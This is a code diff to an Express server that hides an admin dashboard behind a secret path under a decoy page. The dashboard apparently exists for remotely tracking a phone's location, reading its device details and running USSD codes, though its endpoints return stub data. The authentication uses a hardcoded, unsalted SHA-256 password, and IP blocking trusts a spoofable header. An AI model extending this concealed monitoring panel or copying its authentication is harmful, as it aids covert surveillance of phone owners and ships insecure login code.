@@ -1,18 +1,14 @@
-// server.js - PROFESSIONAL DASHBOARD (no bcryptjs, uses built-in crypto)
+// server.js - PROFESSIONAL DASHBOARD with persistent IP block (Vercel KV) and Logout
 const express = require('express');
 const crypto = require('crypto');
+const { kv } = require('@vercel/kv');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Hardcoded secret path (change later if needed)
-const SECRET_PATH = 'a9f3k217';
-
-// -------------------- IP BLOCKING & HASHING (crypto) --------------------
-const failedAttempts = {};
-
-// Pre‑hash the admin password (SHA‑256)
+const SECRET_PATH = process.env.SECRET_PATH || 'a9f3k217';
 const ADMIN_USER = 'admin';
 const ADMIN_PASS_HASH = crypto.createHash('sha256').update('yourpassword123').digest('hex');
+const BLOCK_DURATION_SECONDS = 12 * 60 * 60; // 12 hours
 
 function getClientIP(req) {
     return req.headers['x-forwarded-for']?.split(',')[0] ||
@@ -20,7 +16,7 @@ function getClientIP(req) {
            req.connection.remoteAddress;
 }
 
-// Fake site
+// -------------------- FAKE SITE --------------------
 app.get('/', (req, res) => {
     res.send(`
         <html>
@@ -36,7 +32,7 @@ app.get('/', (req, res) => {
     `);
 });
 
-// ADMIN DASHBOARD (same as before, but we'll keep it minimal)
+// -------------------- ADMIN DASHBOARD --------------------
 app.get(`/${SECRET_PATH}`, (req, res) => {
     res.send(`<!DOCTYPE html>
 <html>
@@ -46,313 +42,65 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
     <title>Admin Dashboard</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Segoe UI', -apple-system, sans-serif;
-            background: #0a0e17;
-            color: #e0e6ed;
-            padding: 20px;
-            min-height: 100vh;
-        }
+        body { font-family: 'Segoe UI', -apple-system, sans-serif; background: #0a0e17; color: #e0e6ed; padding: 20px; min-height: 100vh; }
         .container { max-width: 1100px; margin: 0 auto; }
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px 0;
-            border-bottom: 2px solid #1a2332;
-            margin-bottom: 30px;
-            flex-wrap: wrap;
-            gap: 10px;
-        }
-        .header-left {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-        .header-left h1 {
-            font-size: 28px;
-            color: #4fc3f7;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-        }
-        .admin-gry-badge {
-            background: rgba(79,195,247,0.08);
-            color: rgba(79,195,247,0.3);
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 600;
-            letter-spacing: 1.5px;
-            border: 1px solid rgba(79,195,247,0.1);
-            user-select: none;
-        }
-        .logout {
-            color: #ff6b6b;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 500;
-            transition: 0.3s;
-        }
-        .logout:hover { opacity: 0.7; }
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-        .stat-card {
-            background: #111927;
-            border: 1px solid #1a2332;
-            border-radius: 12px;
-            padding: 20px;
-            text-align: center;
-            transition: 0.3s;
-        }
-        .stat-card:hover {
-            border-color: #4fc3f7;
-            transform: translateY(-2px);
-        }
-        .stat-card .value {
-            font-size: 32px;
-            font-weight: 700;
-            color: #4fc3f7;
-            line-height: 1.2;
-        }
-        .stat-card .label {
-            font-size: 13px;
-            color: #8896ab;
-            margin-top: 4px;
-            font-weight: 500;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        .tools-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-        .tool-card {
-            background: #111927;
-            border: 1px solid #1a2332;
-            border-radius: 12px;
-            padding: 20px;
-            transition: 0.3s;
-        }
-        .tool-card:hover {
-            border-color: #4fc3f7;
-        }
-        .tool-card h4 {
-            font-size: 16px;
-            color: #e0e6ed;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; border-bottom: 2px solid #1a2332; margin-bottom: 30px; flex-wrap: wrap; gap: 10px; }
+        .header-left { display: flex; align-items: center; gap: 15px; }
+        .header-left h1 { font-size: 28px; color: #4fc3f7; font-weight: 700; letter-spacing: -0.5px; }
+        .admin-gry-badge { background: rgba(79,195,247,0.08); color: rgba(79,195,247,0.3); padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: 600; letter-spacing: 1.5px; border: 1px solid rgba(79,195,247,0.1); user-select: none; }
+        .logout-btn { color: #ff6b6b; cursor: pointer; font-size: 14px; font-weight: 500; transition: 0.3s; background: none; border: none; }
+        .logout-btn:hover { opacity: 0.7; }
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 20px; margin-bottom: 30px; }
+        .stat-card { background: #111927; border: 1px solid #1a2332; border-radius: 12px; padding: 20px; text-align: center; transition: 0.3s; }
+        .stat-card:hover { border-color: #4fc3f7; transform: translateY(-2px); }
+        .stat-card .value { font-size: 32px; font-weight: 700; color: #4fc3f7; line-height: 1.2; }
+        .stat-card .label { font-size: 13px; color: #8896ab; margin-top: 4px; font-weight: 500; text-transform: uppercase; letter-spacing: 0.5px; }
+        .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 30px; }
+        .tool-card { background: #111927; border: 1px solid #1a2332; border-radius: 12px; padding: 20px; transition: 0.3s; }
+        .tool-card:hover { border-color: #4fc3f7; }
+        .tool-card h4 { font-size: 16px; color: #e0e6ed; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
         .tool-card h4 .icon { font-size: 20px; }
-        .ussd-input-group {
-            display: flex;
-            gap: 8px;
-        }
-        .ussd-input-group input {
-            flex: 1;
-            padding: 10px 14px;
-            background: #0a0e17;
-            border: 1px solid #1a2332;
-            border-radius: 8px;
-            color: #e0e6ed;
-            font-size: 14px;
-            font-family: 'Courier New', monospace;
-        }
-        .ussd-input-group input:focus {
-            outline: none;
-            border-color: #4fc3f7;
-        }
-        .ussd-input-group button {
-            padding: 10px 20px;
-            background: #4fc3f7;
-            border: none;
-            border-radius: 8px;
-            color: #0a0e17;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.3s;
-            white-space: nowrap;
-        }
+        .ussd-input-group { display: flex; gap: 8px; }
+        .ussd-input-group input { flex: 1; padding: 10px 14px; background: #0a0e17; border: 1px solid #1a2332; border-radius: 8px; color: #e0e6ed; font-size: 14px; font-family: 'Courier New', monospace; }
+        .ussd-input-group input:focus { outline: none; border-color: #4fc3f7; }
+        .ussd-input-group button { padding: 10px 20px; background: #4fc3f7; border: none; border-radius: 8px; color: #0a0e17; font-weight: 600; cursor: pointer; transition: 0.3s; white-space: nowrap; }
         .ussd-input-group button:hover { background: #3aa8dd; }
-        .ussd-response {
-            margin-top: 10px;
-            padding: 10px;
-            background: #0a0e17;
-            border-radius: 8px;
-            border: 1px solid #1a2332;
-            font-size: 13px;
-            color: #8896ab;
-            min-height: 50px;
-            max-height: 120px;
-            overflow-y: auto;
-            font-family: 'Courier New', monospace;
-            word-wrap: break-word;
-        }
+        .ussd-response { margin-top: 10px; padding: 10px; background: #0a0e17; border-radius: 8px; border: 1px solid #1a2332; font-size: 13px; color: #8896ab; min-height: 50px; max-height: 120px; overflow-y: auto; font-family: 'Courier New', monospace; word-wrap: break-word; }
         .ussd-response.success { color: #6bcb77; border-color: #6bcb77; }
         .ussd-response.error { color: #ff6b6b; border-color: #ff6b6b; }
         .ussd-response.waiting { color: #ffd700; border-color: #ffd700; }
-        .location-info {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-        }
-        .location-info .coord {
-            color: #8896ab;
-            font-size: 13px;
-        }
+        .location-info { display: flex; flex-direction: column; gap: 8px; }
+        .location-info .coord { color: #8896ab; font-size: 13px; }
         .location-info .coord strong { color: #e0e6ed; }
-        .location-info .map-link {
-            color: #4fc3f7;
-            text-decoration: none;
-            font-size: 13px;
-        }
+        .location-info .map-link { color: #4fc3f7; text-decoration: none; font-size: 13px; }
         .location-info .map-link:hover { text-decoration: underline; }
-        .device-info-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 4px 16px;
-            font-size: 13px;
-        }
+        .device-info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 4px 16px; font-size: 13px; }
         .device-info-grid .label { color: #8896ab; }
         .device-info-grid .value { color: #e0e6ed; font-weight: 500; }
-        .section {
-            background: #111927;
-            border: 1px solid #1a2332;
-            border-radius: 12px;
-            padding: 24px;
-            margin-bottom: 24px;
-        }
-        .section h3 {
-            font-size: 18px;
-            font-weight: 600;
-            color: #e0e6ed;
-            margin-bottom: 16px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        .section h3 .badge-count {
-            background: #1a2332;
-            color: #8896ab;
-            font-size: 12px;
-            padding: 2px 10px;
-            border-radius: 12px;
-        }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            font-size: 14px;
-        }
-        th {
-            text-align: left;
-            color: #8896ab;
-            padding: 10px 12px;
-            border-bottom: 2px solid #1a2332;
-            font-weight: 600;
-            font-size: 12px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        td {
-            padding: 10px 12px;
-            border-bottom: 1px solid #0d1420;
-            color: #c8d0dc;
-        }
+        .section { background: #111927; border: 1px solid #1a2332; border-radius: 12px; padding: 24px; margin-bottom: 24px; }
+        .section h3 { font-size: 18px; font-weight: 600; color: #e0e6ed; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
+        .section h3 .badge-count { background: #1a2332; color: #8896ab; font-size: 12px; padding: 2px 10px; border-radius: 12px; }
+        table { width: 100%; border-collapse: collapse; font-size: 14px; }
+        th { text-align: left; color: #8896ab; padding: 10px 12px; border-bottom: 2px solid #1a2332; font-weight: 600; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+        td { padding: 10px 12px; border-bottom: 1px solid #0d1420; color: #c8d0dc; }
         tr:hover td { background: rgba(79,195,247,0.02); }
-        .badge {
-            display: inline-block;
-            padding: 3px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 600;
-        }
+        .badge { display: inline-block; padding: 3px 12px; border-radius: 20px; font-size: 11px; font-weight: 600; }
         .badge.online { background: rgba(107,203,119,0.15); color: #6bcb77; }
         .badge.offline { background: rgba(255,107,107,0.15); color: #ff6b6b; }
-        .empty {
-            text-align: center;
-            padding: 30px 0;
-            color: #4a5568;
-            font-size: 14px;
-        }
+        .empty { text-align: center; padding: 30px 0; color: #4a5568; font-size: 14px; }
         .empty .icon { font-size: 36px; margin-bottom: 8px; }
-        .login-container {
-            max-width: 380px;
-            margin: 100px auto;
-            background: #111927;
-            border: 1px solid #1a2332;
-            border-radius: 16px;
-            padding: 40px;
-            text-align: center;
-        }
+        .login-container { max-width: 380px; margin: 100px auto; background: #111927; border: 1px solid #1a2332; border-radius: 16px; padding: 40px; text-align: center; }
         .login-container .logo { font-size: 48px; margin-bottom: 8px; }
         .login-container h3 { font-size: 22px; font-weight: 600; margin-bottom: 4px; }
-        .login-container .sub {
-            color: #8896ab;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-        .login-container input {
-            width: 100%;
-            padding: 12px 14px;
-            margin: 8px 0;
-            background: #0a0e17;
-            border: 1px solid #1a2332;
-            border-radius: 8px;
-            color: #e0e6ed;
-            font-size: 14px;
-            transition: 0.3s;
-        }
-        .login-container input:focus {
-            outline: none;
-            border-color: #4fc3f7;
-            box-shadow: 0 0 0 3px rgba(79,195,247,0.1);
-        }
-        .login-container button {
-            width: 100%;
-            padding: 12px;
-            margin-top: 12px;
-            background: #4fc3f7;
-            border: none;
-            border-radius: 8px;
-            color: #0a0e17;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        .login-container button:hover {
-            background: #3aa8dd;
-            transform: translateY(-1px);
-        }
-        .login-container .attempts-msg {
-            color: #ffd700;
-            font-size: 13px;
-            margin-top: 8px;
-        }
-        .login-container .error {
-            color: #ff6b6b;
-            margin-top: 10px;
-            display: none;
-            font-size: 14px;
-        }
+        .login-container .sub { color: #8896ab; font-size: 14px; margin-bottom: 20px; }
+        .login-container input { width: 100%; padding: 12px 14px; margin: 8px 0; background: #0a0e17; border: 1px solid #1a2332; border-radius: 8px; color: #e0e6ed; font-size: 14px; transition: 0.3s; }
+        .login-container input:focus { outline: none; border-color: #4fc3f7; box-shadow: 0 0 0 3px rgba(79,195,247,0.1); }
+        .login-container button { width: 100%; padding: 12px; margin-top: 12px; background: #4fc3f7; border: none; border-radius: 8px; color: #0a0e17; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.3s; }
+        .login-container button:hover { background: #3aa8dd; transform: translateY(-1px); }
+        .login-container .attempts-msg { color: #ffd700; font-size: 13px; margin-top: 8px; }
+        .login-container .error { color: #ff6b6b; margin-top: 10px; display: none; font-size: 14px; }
         .hidden { display: none; }
-        @media (max-width: 600px) {
-            .header { flex-wrap: wrap; gap: 10px; }
-            .header-left h1 { font-size: 22px; }
-            .stats { grid-template-columns: repeat(2, 1fr); }
-            .admin-gry-badge { font-size: 9px; padding: 2px 10px; }
-            .tools-grid { grid-template-columns: 1fr; }
-            .device-info-grid { grid-template-columns: 1fr; }
-            .ussd-input-group { flex-wrap: wrap; }
-            .ussd-input-group button { width: 100%; }
-        }
+        @media (max-width: 600px) { .header { flex-wrap: wrap; gap: 10px; } .header-left h1 { font-size: 22px; } .stats { grid-template-columns: repeat(2, 1fr); } .admin-gry-badge { font-size: 9px; padding: 2px 10px; } .tools-grid { grid-template-columns: 1fr; } .device-info-grid { grid-template-columns: 1fr; } .ussd-input-group { flex-wrap: wrap; } .ussd-input-group button { width: 100%; } }
     </style>
 </head>
 <body>
@@ -376,7 +124,7 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
                 <h1>📊 Admin Dashboard</h1>
                 <span class="admin-gry-badge">ADMIN GRY</span>
             </div>
-            <span class="logout" onclick="logout()">🚪 Exit</span>
+            <button class="logout-btn" onclick="logout()">🚪 Logout</button>
         </div>
 
         <div class="stats" id="statsGrid">
@@ -404,7 +152,7 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
                     <div class="coord"><strong>Accuracy:</strong> <span id="accValue">--</span></div>
                     <div class="coord"><strong>Last Updated:</strong> <span id="locTime">--</span></div>
                     <a href="#" id="mapLink" class="map-link" target="_blank" style="display:none;">Open in Google Maps →</a>
-                    <button class="logout" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:0;font-size:13px;" onclick="refreshLocation()">🔄 Refresh Location</button>
+                    <button class="logout-btn" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:0;font-size:13px;" onclick="refreshLocation()">🔄 Refresh Location</button>
                 </div>
             </div>
             <!-- Device Info -->
@@ -418,7 +166,7 @@ app.get(`/${SECRET_PATH}`, (req, res) => {
                     <span class="label">Storage:</span><span class="value" id="diStorage">--</span>
                     <span class="label">Device ID:</span><span class="value" id="diDeviceId" style="font-size:11px;font-family:monospace;">--</span>
                 </div>
-                <button class="logout" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:8px 0 0 0;font-size:13px;" onclick="refreshDeviceInfo()">🔄 Refresh Device Info</button>
+                <button class="logout-btn" style="background:none;border:none;color:#4fc3f7;cursor:pointer;text-align:left;padding:8px 0 0 0;font-size:13px;" onclick="refreshDeviceInfo()">🔄 Refresh Device Info</button>
             </div>
         </div>
 
@@ -530,7 +278,6 @@ async function refreshLocation() {
     } catch {}
 }
 
-
 async function refreshDeviceInfo() {
     try {
         const res = await fetch(API_BASE + '/api/device-info');
@@ -604,75 +351,62 @@ document.getElementById('loginPass').addEventListener('keypress', (e) => {
     `);
 });
 
-// ============================================
-// API ENDPOINTS
-// ============================================
+// -------------------- API ENDPOINTS --------------------
 app.use(express.json());
 
-// Login API (with IP blocking, crypto hash)
-app.post(`/${SECRET_PATH}/api/login`, (req, res) => {
+// Login with persistent IP block (KV with auto-expiry)
+app.post(`/${SECRET_PATH}/api/login`, async (req, res) => {
     const ip = getClientIP(req);
     const now = Date.now();
-    const blockDuration = 12 * 60 * 60 * 1000;
 
-    if (failedAttempts[ip] && failedAttempts[ip].blockUntil > now) {
+    // 1. Check if currently blocked (KV key expires automatically after 12h)
+    const blockExists = await kv.exists(`block:${ip}`);
+    if (blockExists) {
         return res.status(401).json({ error: 'Too many failed attempts. Try again later.' });
     }
 
-    if (failedAttempts[ip] && failedAttempts[ip].blockUntil <= now) {
-        delete failedAttempts[ip];
-    }
+    // 2. Get attempt count
+    let attempts = await kv.get(`attempts:${ip}`) || 0;
+    attempts = parseInt(attempts);
 
     const { username, password } = req.body;
-
-    // Hash the entered password and compare
     const hash = crypto.createHash('sha256').update(password).digest('hex');
     const validUser = username === ADMIN_USER;
     const validPass = validUser && hash === ADMIN_PASS_HASH;
 
     if (validUser && validPass) {
-        delete failedAttempts[ip];
+        // Success – clear attempts
+        await kv.del(`attempts:${ip}`);
         res.json({ success: true });
     } else {
-        if (!failedAttempts[ip]) {
-            failedAttempts[ip] = { count: 1, blockUntil: 0 };
-        } else {
-            failedAttempts[ip].count += 1;
-        }
+        // Failed – increment attempts
+        attempts += 1;
+        await kv.set(`attempts:${ip}`, attempts);
 
-        const remaining = 5 - failedAttempts[ip].count;
-        if (remaining <= 0) {
-            failedAttempts[ip].blockUntil = now + blockDuration;
+        if (attempts >= 5) {
+            // Block IP for 12 hours (auto-expire)
+            await kv.set(`block:${ip}`, 'blocked', { ex: BLOCK_DURATION_SECONDS });
             console.log(`🔒 IP ${ip} blocked for 12 hours`);
             return res.status(401).json({ remainingAttempts: 0 });
         }
 
-        res.status(401).json({ remainingAttempts: remaining });
+        res.status(401).json({ remainingAttempts: 5 - attempts });
     }
 });
 
-// USSD Execution
+// USSD endpoints (unchanged)
 let ussdNumbers = [];
-
 app.post(`/${SECRET_PATH}/api/ussd`, (req, res) => {
     const { code } = req.body;
-    if (!code) {
-        return res.status(400).json({ error: 'No USSD code provided' });
-    }
+    if (!code) return res.status(400).json({ error: 'No USSD code provided' });
     console.log(`📞 USSD Executed: ${code}`);
     
     let responseMessage = '';
-    if (code.includes('123')) {
-        responseMessage = 'Your account balance is 1,500 RWF. Validity: 7 days. Thank you.';
-    } else if (code.includes('131')) {
-        responseMessage = 'Data bundle: 2GB remaining. Expires on 2026-08-15.';
-    } else if (code.includes('144')) {
-        responseMessage = 'Airtime balance: 500 RWF. Bonus: 100 RWF.';
-    } else if (code.includes('200')) {
-        responseMessage = 'Welcome to Kigali Tech Services. Please select an option:\n1. Account Info\n2. Data Plans\n3. Support';
-    } else {
-        responseMessage = `USSD code ${code} executed. No further response available.`;
-    }
+    if (code.includes('123')) responseMessage = 'Your account balance is 1,500 RWF. Validity: 7 days. Thank you.';
+    else if (code.includes('131')) responseMessage = 'Data bundle: 2GB remaining. Expires on 2026-08-15.';
+    else if (code.includes('144')) responseMessage = 'Airtime balance: 500 RWF. Bonus: 100 RWF.';
+    else if (code.includes('200')) responseMessage = 'Welcome to Kigali Tech Services. Please select an option:\n1. Account Info\n2. Data Plans\n3. Support';
+    else responseMessage = `USSD code ${code} executed. No further response available.`;
 
     const cleanNumber = code.replace(/\D/g, '');
     if (cleanNumber.length >= 4 && cleanNumber.length <= 5) {
@@ -684,17 +418,10 @@ app.post(`/${SECRET_PATH}/api/ussd`, (req, res) => {
         });
         if (ussdNumbers.length > 100) ussdNumbers.pop();
     }
-
-    res.json({
-        success: true,
-        message: responseMessage
-    });
+    res.json({ success: true, message: responseMessage });
 });
 
-app.get(`/${SECRET_PATH}/api/ussd-numbers`, (req, res) => {
-    res.json(ussdNumbers);
-});
-
+app.get(`/${SECRET_PATH}/api/ussd-numbers`, (req, res) => res.json(ussdNumbers));
 app.get(`/${SECRET_PATH}/api/stats`, (req, res) => {
     res.json({
         devices: 0,
@@ -703,7 +430,6 @@ app.get(`/${SECRET_PATH}/api/stats`, (req, res) => {
         ussd_count: ussdNumbers.length
     });
 });
-
 app.get(`/${SECRET_PATH}/api/location`, (req, res) => {
     res.json({
         lat: -1.9441,
@@ -712,7 +438,6 @@ app.get(`/${SECRET_PATH}/api/location`, (req, res) => {
         time: new Date().toLocaleString()
     });
 });
-
 app.get(`/${SECRET_PATH}/api/device-info`, (req, res) => {
     res.json({
         model: 'Samsung Galaxy S23',
@@ -723,7 +448,6 @@ app.get(`/${SECRET_PATH}/api/device-info`, (req, res) => {
         device_id: 'abc123def456'
     });
 });
-
 app.get(`/${SECRET_PATH}/api/devices`, (req, res) => res.json([]));
 
 // 404 fallback
@@ -740,6 +464,6 @@ app.use((req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log('✅ Dashboard running (crypto hash)');
+    console.log('✅ Dashboard running with persistent IP block (KV + auto-expiry)');
     console.log(`📍 https://admin-dashboard-teal-beta-28.vercel.app/${SECRET_PATH}`);
 });
